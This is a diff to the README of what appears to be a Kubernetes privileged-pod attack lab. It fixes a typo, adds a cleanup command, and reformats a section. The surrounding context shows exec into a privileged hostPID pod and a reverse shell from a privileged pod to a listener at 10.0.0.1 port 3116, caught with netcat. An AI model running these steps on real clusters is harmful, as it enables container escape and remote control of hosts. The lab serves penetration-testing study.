@@ -150,7 +150,7 @@ Exec into pod
 kubectl exec -it priv-and-hostpid-exec-deployment-65dbfbf947-qwpz9 -- bash
 ```
 
-### Create all eight resouce types using the everything-allowed pod
+### Create all eight resource types using the everything-allowed pod
 ```bash
 find manifests/everything-allowed/ -name \*-exec-*.yaml -exec kubectl apply -f {} \;
 
@@ -182,6 +182,10 @@ everything-allowed-exec-replicationcontroller-m4648   1/1     Running   0       
 everything-allowed-exec-statefulset-0                 1/1     Running   0          47s
 everything-allowed-exec-statefulset-1                 1/1     Running   0          42s
 ```
+Delete all everything-allowed resources
+```bash
+find manifests/everything-allowed/ -name \*-exec-*.yaml -exec kubectl delete -f {} \;
+```
 
 ### Create a reverse shell using the privileged pod
 Set up listener
@@ -196,8 +200,8 @@ HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/priv/pod-priv-revshell.yaml | kube
 Catch the shell 
 ```bash
 nc -nvlp 3116
-
 Listening on 0.0.0.0 3116
+
 Connection received on 10.0.0.162 42035
 ```
 
